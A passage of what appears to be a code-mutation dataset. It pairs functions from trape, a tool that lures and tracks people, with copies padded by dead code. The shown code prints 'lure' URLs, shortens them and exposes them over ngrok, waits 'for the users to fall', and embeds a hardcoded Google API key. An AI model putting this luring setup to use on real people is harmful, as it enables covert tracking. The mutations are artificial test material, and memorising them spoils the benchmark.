utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + e.message)\n                utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n        utils.Go('\\n' + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '>' + utils.Color['white'] + ']' + utils.Color['whiteBold'] + ' ' + 'Start time:' + ' ' + utils.Color['white'] + self.date_start)\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '?' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Do not forget to close ' + self.name_trape + ', after use. Press Control C' + ' ' + utils.Color['white'] + '\\n')\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '\u00a1' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Waiting for the users to fall...' + '\\n')",
            "def header(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.stat == 1:\n        utils.banner()\n        changeLog = requests.get('https://raw.githubusercontent.com/jofpin/trape/master/version.txt', timeout=4)\n        changeLog = changeLog.text.split(' ')[1]\n        changeLog = changeLog.strip()\n        if changeLog != self.version:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['yellowBold'] + 'NEW VERSION IS AVAILABLE: ' + utils.Color['white'] + 'v' + utils.Color['redBold'] + changeLog + utils.Color['white'] + ' ' + '(install changes)')\n            utils.Go('')\n        else:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['greenBold'] + 'RUNNING RECENT VERSION' + utils.Color['white'])\n            utils.Go('')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'LOCAL INFORMATION' + utils.Text['end'])\n        utils.Go('\\t' + '-------------------')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Lure for the users: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your REST API path: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel Link: ' + utils.Color['blue'] + 'http://127.0.0.1:' + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your Access key: ' + utils.Color['blue'] + self.stats_key + utils.Color['white'])\n        utils.Go('')\n        if self.ngrok != '':\n            if self.googl == '':\n                self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'\n            try:\n                opener = urllib.request.build_opener()\n                pLog = 4040\n                ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                time.sleep(0.5)\n                ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos <= 0:\n                    time.sleep(4)\n                    ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                    ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos >= 0:\n                    ngrokStatus = ngrokStatus[ngrokUrlPos - 25:ngrokUrlPos + 28]\n                    ngrokUrlPos = ngrokStatus.find('http')\n                    ngrokUrlPos2 = ngrokStatus.find('.io')\n                    ngrokStatus = ngrokStatus[ngrokUrlPos:ngrokUrlPos2] + '.io'\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'PUBLIC INFORMATION' + utils.Text['end'])\n                    utils.Go('\\t' + '-------------------')\n                    r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)\n                    self.nGrokUrl = ngrokStatus.replace('https', 'http')\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Public lure: ' + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel link: ' + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])\n                else:\n                    utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n            except Exception as e:\n                utils.Go(utils.Color['white'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + e.message)\n                utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n        utils.Go('\\n' + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '>' + utils.Color['white'] + ']' + utils.Color['whiteBold'] + ' ' + 'Start time:' + ' ' + utils.Color['white'] + self.date_start)\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '?' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Do not forget to close ' + self.name_trape + ', after use. Press Control C' + ' ' + utils.Color['white'] + '\\n')\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '\u00a1' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Waiting for the users to fall...' + '\\n')",
            "def header(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.stat == 1:\n        utils.banner()\n        changeLog = requests.get('https://raw.githubusercontent.com/jofpin/trape/master/version.txt', timeout=4)\n        changeLog = changeLog.text.split(' ')[1]\n        changeLog = changeLog.strip()\n        if changeLog != self.version:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['yellowBold'] + 'NEW VERSION IS AVAILABLE: ' + utils.Color['white'] + 'v' + utils.Color['redBold'] + changeLog + utils.Color['white'] + ' ' + '(install changes)')\n            utils.Go('')\n        else:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['greenBold'] + 'RUNNING RECENT VERSION' + utils.Color['white'])\n            utils.Go('')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'LOCAL INFORMATION' + utils.Text['end'])\n        utils.Go('\\t' + '-------------------')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Lure for the users: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your REST API path: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel Link: ' + utils.Color['blue'] + 'http://127.0.0.1:' + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your Access key: ' + utils.Color['blue'] + self.stats_key + utils.Color['white'])\n        utils.Go('')\n        if self.ngrok != '':\n            if self.googl == '':\n                self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'\n            try:\n                opener = urllib.request.build_opener()\n                pLog = 4040\n                ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                time.sleep(0.5)\n                ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos <= 0:\n                    time.sleep(4)\n                    ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                    ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos >= 0:\n                    ngrokStatus = ngrokStatus[ngrokUrlPos - 25:ngrokUrlPos + 28]\n                    ngrokUrlPos = ngrokStatus.find('http')\n                    ngrokUrlPos2 = ngrokStatus.find('.io')\n                    ngrokStatus = ngrokStatus[ngrokUrlPos:ngrokUrlPos2] + '.io'\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'PUBLIC INFORMATION' + utils.Text['end'])\n                    utils.Go('\\t' + '-------------------')\n                    r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)\n                    self.nGrokUrl = ngrokStatus.replace('https', 'http')\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Public lure: ' + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel link: ' + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])\n                else:\n                    utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n            except Exception as e:\n                utils.Go(utils.Color['white'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + e.message)\n                utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n        utils.Go('\\n' + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '>' + utils.Color['white'] + ']' + utils.Color['whiteBold'] + ' ' + 'Start time:' + ' ' + utils.Color['white'] + self.date_start)\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '?' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Do not forget to close ' + self.name_trape + ', after use. Press Control C' + ' ' + utils.Color['white'] + '\\n')\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '\u00a1' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Waiting for the users to fall...' + '\\n')",
            "def header(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.stat == 1:\n        utils.banner()\n        changeLog = requests.get('https://raw.githubusercontent.com/jofpin/trape/master/version.txt', timeout=4)\n        changeLog = changeLog.text.split(' ')[1]\n        changeLog = changeLog.strip()\n        if changeLog != self.version:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['yellowBold'] + 'NEW VERSION IS AVAILABLE: ' + utils.Color['white'] + 'v' + utils.Color['redBold'] + changeLog + utils.Color['white'] + ' ' + '(install changes)')\n            utils.Go('')\n        else:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['greenBold'] + 'RUNNING RECENT VERSION' + utils.Color['white'])\n            utils.Go('')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'LOCAL INFORMATION' + utils.Text['end'])\n        utils.Go('\\t' + '-------------------')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Lure for the users: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your REST API path: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel Link: ' + utils.Color['blue'] + 'http://127.0.0.1:' + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your Access key: ' + utils.Color['blue'] + self.stats_key + utils.Color['white'])\n        utils.Go('')\n        if self.ngrok != '':\n            if self.googl == '':\n                self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'\n            try:\n                opener = urllib.request.build_opener()\n                pLog = 4040\n                ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                time.sleep(0.5)\n                ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos <= 0:\n                    time.sleep(4)\n                    ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                    ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos >= 0:\n                    ngrokStatus = ngrokStatus[ngrokUrlPos - 25:ngrokUrlPos + 28]\n                    ngrokUrlPos = ngrokStatus.find('http')\n                    ngrokUrlPos2 = ngrokStatus.find('.io')\n                    ngrokStatus = ngrokStatus[ngrokUrlPos:ngrokUrlPos2] + '.io'\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'PUBLIC INFORMATION' + utils.Text['end'])\n                    utils.Go('\\t' + '-------------------')\n                    r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)\n                    self.nGrokUrl = ngrokStatus.replace('https', 'http')\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Public lure: ' + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel link: ' + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])\n                else:\n                    utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n            except Exception as e:\n                utils.Go(utils.Color['white'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + e.message)\n                utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n        utils.Go('\\n' + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '>' + utils.Color['white'] + ']' + utils.Color['whiteBold'] + ' ' + 'Start time:' + ' ' + utils.Color['white'] + self.date_start)\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '?' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Do not forget to close ' + self.name_trape + ', after use. Press Control C' + ' ' + utils.Color['white'] + '\\n')\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '\u00a1' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Waiting for the users to fall...' + '\\n')"
        ]
    },
    {
        "func_name": "rootConnection",
        "original": "def rootConnection(self):\n    pass",
        "mutated": [
            "def rootConnection(self):\n    if False:\n        i = 10\n    pass",
            "def rootConnection(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    pass",
            "def rootConnection(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    pass",
            "def rootConnection(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    pass",
            "def rootConnection(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    pass"
        ]
    },
    {
        "func_name": "loadCheck",
        "original": "def loadCheck(self):\n    utils.checkOS()",
        "mutated": [
            "def loadCheck(self):\n    if False:\n        i = 10\n    utils.checkOS()",
            "def loadCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    utils.checkOS()",
            "def loadCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    utils.checkOS()",
            "def loadCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    utils.checkOS()",
            "def loadCheck(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    utils.checkOS()"
        ]
    },
    {
        "func_name": "main",
        "original": "def main(self):\n    import core.sockets",
        "mutated": [
            "def main(self):\n    if False:\n        i = 10\n    import core.sockets",
            "def main(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    import core.sockets",
            "def main(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    import core.sockets",
            "def main(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    import core.sockets",
            "def main(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    import core.sockets"
        ]
    },
    {
        "func_name": "trape_config",
        "original": "def trape_config(self):\n    utils.Go('\\x1b[H\\x1b[J')\n    utils.Go('----------------------------------------------------------')\n    utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Configuration zone to use the software' + ' ' + '<' + utils.Color['white'])\n    utils.Go('----------------------------------------------------------')\n    utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n    utils.Go('--------' + '\\n')\n    utils.Go(utils.Color['whiteBold'] + 'GENERAL CONFIG' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('Through this section you will configure the resources required \\nfor an effective function of trape, please complete the following steps, below. \\nKeep in mind that if the data is incorrect this tool will not work.' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'NGROK TOKEN' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('In the next section you must enter your Ngrok token, if you do not have \\none register at (' + utils.Color['blueBold'] + 'https://ngrok.com' + utils.Color['white'] + '), this data is necessary for the generation of public network tunnels.')\n    utils.Go('')\n    c_nGrokToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter your ngrok token' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'GOOGLE API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'Google Console' + utils.Color['white'] + ', and get an API for maps and another for shortening. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_gMapsToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your Google Maps Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    c_gOoglToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + \" Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)\" + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'IP INFO API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'https://ipgeolocation.io' + utils.Color['white'] + ', and get an API for geolocation. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_ipinfo = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your IP Info Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Congratulations! ' + utils.Color['greenBold'] + 'Successful configuration' + utils.Color['white'] + ', now enjoy Trape!' + utils.Color['white'])\n    utils.Go('')\n    time.sleep(0.4)\n    if c_nGrokToken != '' and c_gMapsToken != '':\n        v = '{\\n\\t\"ngrok_token\" : \"' + c_nGrokToken + '\",\\n\\t\"gmaps_api_key\" : \"' + c_gMapsToken + '\",\\n\\t\"gshortener_api_key\" : \"' + c_gOoglToken + '\",\\n\\t\"ipinfo_api_key\" : \"' + c_ipinfo + '\"\\n}'\n        f = open('trape.config', 'w')\n        f.write(v)\n        f.close()\n    else:\n        self.trape_config()",
        "mutated": [
            "def trape_config(self):\n    if False:\n        i = 10\n    utils.Go('\\x1b[H\\x1b[J')\n    utils.Go('----------------------------------------------------------')\n    utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Configuration zone to use the software' + ' ' + '<' + utils.Color['white'])\n    utils.Go('----------------------------------------------------------')\n    utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n    utils.Go('--------' + '\\n')\n    utils.Go(utils.Color['whiteBold'] + 'GENERAL CONFIG' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('Through this section you will configure the resources required \\nfor an effective function of trape, please complete the following steps, below. \\nKeep in mind that if the data is incorrect this tool will not work.' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'NGROK TOKEN' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('In the next section you must enter your Ngrok token, if you do not have \\none register at (' + utils.Color['blueBold'] + 'https://ngrok.com' + utils.Color['white'] + '), this data is necessary for the generation of public network tunnels.')\n    utils.Go('')\n    c_nGrokToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter your ngrok token' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'GOOGLE API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'Google Console' + utils.Color['white'] + ', and get an API for maps and another for shortening. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_gMapsToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your Google Maps Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    c_gOoglToken = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + \" Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)\" + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['whiteBold'] + 'IP INFO API' + utils.Color['white'])\n    utils.Go('------')\n    utils.Go('You must register with the ' + utils.Color['blueBold'] + 'https://ipgeolocation.io' + utils.Color['white'] + ', and get an API for geolocation. \\nBy having these data you complete the settings')\n    utils.Go('')\n    c_ipinfo = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your IP Info Api Key?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n    utils.Go('')\n    utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Congratulations! ' + utils.Color['greenBold'] + 'Successful configuration' + utils.Color['white'] + ', now enjoy Trape!' + utils.Color['white'])\n    utils.Go('')\n    time.sleep(0.4)\n    if c_nGrokToken != '' and c_gMapsToken != '':\n        v = '{\\n\\t\"ngrok_token\" : \"' + c_nGrokToken + '\",\\n\\t\"gmaps_api_key\" : \"' + c_gMapsToken + '\",\\n\\t\"gshortener_api_key\" : \"' + c_gOoglToken + '\",\\n\\t\"ipinfo_api_key\" : \"' + c_ipinfo + '\"\\n}'\n        f = open('trape.config', 'w')\n        f.write(v)\n  